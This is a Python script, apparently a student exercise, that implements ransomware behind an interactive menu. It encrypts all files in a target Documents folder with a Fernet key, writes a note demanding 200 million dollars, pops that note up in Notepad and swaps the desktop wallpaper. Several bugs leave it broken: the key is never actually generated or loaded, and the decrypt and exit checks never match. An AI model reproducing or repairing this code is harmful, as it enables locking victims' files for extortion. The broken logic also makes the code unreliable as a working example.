#!/usr/bin/env python3
# Sierra Maldonado
# Worked with Geneva, Justin H, and Nick A
# File Encrytption Script

import os
import subprocess
import datetime
import urllib.request
import ctypes
import win32gui
from cryptography.fernet import Fernet

# Functions to write key and load key
def write_key(self):
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

def load_key(self):
    return open("key.key", "rb").read()
# Write key
write_key

class Ransomware:
    key_enc = (load_key)
    def __init__(self):
        self.sysRoot = os.path.expanduser('~')
        self.key = self.key_enc 
    # Encrypt files using the Fernet symmetric key
    def encrypt_file(self, file_path):
        with open(file_path, "rb") as f:
            data = f.read()
        fernet = Fernet(self.key)
        encrypted = fernet.encrypt(data)
        with open(file_path, "wb") as f:
            f.write(encrypted)

    # Decrypt files using the Fernet symmetric key
    def decrypt_file(self, file_path):
        with open(file_path, "rb") as f:
            data = f.read()
        fernet = Fernet(self.key)
        decrypted = fernet.decrypt(data)
        with open(file_path, "wb") as f:
            f.write(decrypted)

    def change_background(self):
        image = r'C:\Users\Sierra\Downloads\Spooky.jpeg'
        path = f'{self.sysRoot}Desktop/background.jpg'
        urllib.request.urlretrieve(image, path)
        SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)


    # Windows Popup blocker
    def ransom_note(self):
        date = datetime.date.today()
        with open('Note.txt', 'w') as f:
            f.write(f'''
                    Get ducked on NERD, I have stolen and locked away all your data. I will open your Computer for a fee of 200 MILLION dollars\n
                    Please send the money and I will unlock your computer.''')

    def popup(self):
        ransom = subprocess.Popen(['notepad.exe', 'Note.txt'])
        top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())

    def enc(self):
        # Encrypt files in target directory
        target_dir = f'{self.sysRoot}Documents\\TargetFolder'
        for root, dirs, files in os.walk(target_dir):
            for file in files:
                file_path = os.path.join(root, file)
                self.encrypt_file(file_path)


    def dec(self):
        # Decrypt files in target directory
        target_dir = f'{self.sysRoot}Documents\\TargetFolder'
        for root, dirs, files in os.walk(target_dir):
            for file in files:
                file_path = os.path.join(root, file)
                self.decrypt_file(file_path)
ransomware = Ransomware()

while True:
    user_input = input("What would you like to do? (Encrypt, Windows Pop-up, Windows background change, Decrypt, or Exit): ")
    if user_input.lower() == "encrypt":
        #encryption
        ransomware.enc()
    elif user_input.lower() == "windows pop-up":
        # windows pop-up
        ransomware.ransom_note()
        ransomware.popup()
    elif user_input.lower() == "windows background change":
        #windows background change
        ransomware.change_background()
    elif user_input.lower == "decrypt":
        #Decryption
        ransomware.dec()
    elif user_input.lower == "exit":
        break